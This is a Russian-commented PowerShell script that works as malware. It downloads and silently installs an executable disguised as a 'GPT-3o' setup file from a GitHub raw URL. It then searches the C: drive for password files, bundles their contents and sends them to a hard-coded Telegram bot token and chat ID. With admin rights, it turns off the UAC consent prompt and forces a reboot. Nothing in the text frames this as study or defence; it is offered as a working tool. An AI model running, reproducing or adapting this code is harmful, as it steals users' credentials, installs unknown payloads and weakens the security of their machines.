# Блок 1: Скачивание и установка приложения
try {
    Write-Output "=== БЛОК 1: Установка приложения ==="
    $exePath = Join-Path $env:ProgramData 'GPT-3o_win-x64_setup.exe'
    
    # Скачивание файла
    try {
        Write-Output "Настройка безопасности..."
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
        
        Write-Output "Скачивание установочного файла..."
        # Используем WebClient с User-Agent для обхода блокировок
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $webClient.DownloadFile('https://raw.githubusercontent.com/rootkalilocalhost/modules/main/GPT-3o_win-x64_setup.exe', $exePath)
        
        if (Test-Path $exePath) {
            $fileSize = (Get-Item $exePath).Length
            Write-Output "Файл успешно загружен ($([math]::Round($fileSize/1MB, 2)) MB)"
        } else {
            throw "Файл не был сохранен"
        }
    } catch {
        Write-Warning "Ошибка загрузки файла: $($_.Exception.Message)"
        $exePath = $null
    }
    
    # Запуск установки только если файл скачался
    if ($exePath -and (Test-Path $exePath)) {
        Write-Output "Запуск установки с параметром /S (тихая установка)..."
        $processParams = @{
            FilePath = $exePath
            ArgumentList = '/S'
            PassThru = $true
            NoNewWindow = $true
            Wait = $true
        }
        $process = Start-Process @processParams
        
        if ($process.ExitCode -ne 0) {
            Write-Warning "Процесс завершился с кодом ошибки: $($process.ExitCode)"
        } else {
            Write-Output "Установка завершена успешно"
        }
    } else {
        Write-Warning "Файл для установки недоступен, пропускаем установку"
    }
} catch {
    Write-Warning "Критическая ошибка в блоке установки: $($_.Exception.Message)"
} finally {
    # Удаление установщика
    if ($exePath -and (Test-Path $exePath)) {
        try {
            Remove-Item $exePath -Force -ErrorAction SilentlyContinue
            Write-Output "Временный файл удален"
        } catch {
            Write-Warning "Не удалось удалить файл: $($_.Exception.Message)"
        }
    }
}

# Блок 2: Настройки для поиска и Telegram
Write-Output "`n=== БЛОК 2: Настройка параметров ==="
$telegramBotToken = "5574338417:AAHzByMElpQLpyZ72paKuP4Gb2gqcIByKBo"
$chatId = "1473231416"
$searchPatterns = @("пароли.txt", "passwords.txt")
$tempDir = if ($env:TEMP) { $env:TEMP } else { [System.IO.Path]::GetTempPath() }

Write-Output "Telegram Bot: $telegramBotToken"
Write-Output "Chat ID: $chatId"
Write-Output "Поиск шаблонов: $($searchPatterns -join ', ')"
Write-Output "Временная директория: $tempDir"

# Блок 3: Поиск и отправка файлов
try {
    Write-Output "`n=== БЛОК 3: Поиск и отправка файлов ==="
    Write-Output "Запуск поиска файлов на диске C:\..."
    
    $foundFiles = @()
    foreach ($pattern in $searchPatterns) {
        try {
            Write-Output "Поиск файлов по шаблону: $pattern"
            $files = Get-ChildItem "C:\" -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue
            if ($files) {
                $foundFiles += $files
                Write-Output "Найдено файлов '$pattern': $($files.Count)"
            }
        } catch {
            Write-Warning "Ошибка поиска по шаблону $pattern : $($_.Exception.Message)"
        }
    }
    
    # Удаление дубликатов
    $foundFiles = $foundFiles | Sort-Object FullName -Unique
    
    if ($foundFiles.Count -eq 0) {
        Write-Output "Файлы не найдены"
    } else {
        Write-Output "Всего найдено уникальных файлов: $($foundFiles.Count)"
        
        # Создание выходного файла
        $outputFile = Join-Path $tempDir "collected_data_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $encoding = [System.Text.Encoding]::UTF8
        $maxFileSize = 10 * 1024 * 1024  # 10 MB
        $maxTotalSize = 50 * 1024 * 1024  # 50 MB
        
        Write-Output "Создание файла для сбора данных: $outputFile"
        
        # Очистка выходного файла
        if (Test-Path $outputFile) {
            Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
        }
        
        # Чтение и объединение содержимого файлов
        $totalSize = 0
        $processedFiles = 0
        
        foreach ($file in $foundFiles) {
            try {
                # Проверка размера файла
                if ($file.Length -gt $maxFileSize) {
                    Write-Warning "Файл $($file.FullName) слишком большой ($([math]::Round($file.Length/1MB,2)) MB), пропускаем"
                    continue
                }
                
                # Проверка общего размера
                if (($totalSize + $file.Length) -gt $maxTotalSize) {
                    Write-Warning "Достигнут максимальный общий размер данных (50 MB)"
                    break
                }
                
                # Чтение файла
                $content = [System.IO.File]::ReadAllText($file.FullName, $encoding)
                $header = "=== Файл: $($file.FullName) (Размер: $($file.Length) байт) ==="
                [System.IO.File]::AppendAllText($outputFile, "$header`r`n", $encoding)
                [System.IO.File]::AppendAllText($outputFile, "$content`r`n`r`n", $encoding)
                
                $totalSize += $file.Length
                $processedFiles++
                Write-Output "Обработан: $($file.Name) ($processedFiles/$($foundFiles.Count))"
                
            } catch {
                Write-Warning "Ошибка чтения $($file.FullName): $($_.Exception.Message)"
            }
        }
        
        Write-Output "Обработка завершена. Собрано данных: $([math]::Round($totalSize/1KB, 2)) KB"
        
        # Отправка данных через Telegram
        if (Test-Path $outputFile -and (Get-Item $outputFile).Length -gt 0) {
            try {
                $fileInfo = Get-Item $outputFile
                Write-Output "Подготовка к отправке в Telegram ($([math]::Round($fileInfo.Length/1KB,2)) KB)..."
                
                # Отправка через Telegram API
                $telegramUri = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
                
                $form = @{
                    chat_id = $chatId
                    caption = "Найдено файлов: $processedFiles. Общий размер: $([math]::Round($totalSize/1KB, 2)) KB"
                    document = Get-Item $outputFile
                }
                
                Write-Output "Отправка запроса к Telegram API..."
                $response = Invoke-RestMethod -Uri $telegramUri -Method Post -Form $form -ErrorAction Stop
                
                if ($response.ok) {
                    Write-Output "✅ Данные успешно отправлены через Telegram"
                    Write-Output "Message ID: $($response.result.message_id)"
                } else {
                    Write-Warning "Ошибка отправки: $($response.description)"
                }
                
            } catch {
                Write-Warning "Ошибка отправки в Telegram: $($_.Exception.Message)"
                # Дополнительная информация об ошибке
                if ($_.Exception.Response) {
                    Write-Warning "HTTP Status: $($_.Exception.Response.StatusCode)"
                }
            } finally {
                # Очистка временного файла
                if (Test-Path $outputFile) {
                    Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
                    Write-Output "Временные файлы очищены"
                }
            }
        } else {
            Write-Output "Нет данных для отправки"
        }
    }
    
} catch {
    Write-Warning "Критическая ошибка в блоке поиска: $($_.Exception.Message)"
}

# Блок 4: Изменение системных настроек и перезагрузка
try {
    Write-Output "`n=== БЛОК 4: Системные настройки ==="
    
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if ($isAdmin) {
        Write-Output "Обнаружены права администратора..."
        
        # Отключение UAC
        try {
            Write-Output "Отключение UAC..."
            $uacPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            if (Test-Path $uacPath) {
                Set-ItemProperty -Path $uacPath -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Type DWord -Force -ErrorAction Stop
                Write-Output "✅ UAC отключен"
            } else {
                Write-Warning "Не найден путь в реестре для UAC"
            }
        } catch {
            Write-Warning "Не удалось отключить UAC: $($_.Exception.Message)"
        }
        
        # Перезагрузка
        Write-Output "`nПодготовка к перезагрузке..."
        Write-Warning "Перезагрузка компьютера через 15 секунд..."
        
        for ($i = 15; $i -gt 0; $i--) {
            Write-Output "Перезагрузка через $i секунд..."
            Start-Sleep -Seconds 1
        }
        
        Write-Output "Выполняется перезагрузка..."
        Restart-Computer -Force -ErrorAction Stop
        
    } else {
        Write-Output "Недостаточно прав для изменения системных настроек (требуются права администратора)"
    }
} catch {
    Write-Warning "Ошибка в системных настройках: $($_.Exception.Message)"
}

Write-Output "`n=== СКРИПТ ЗАВЕРШЕН ==="
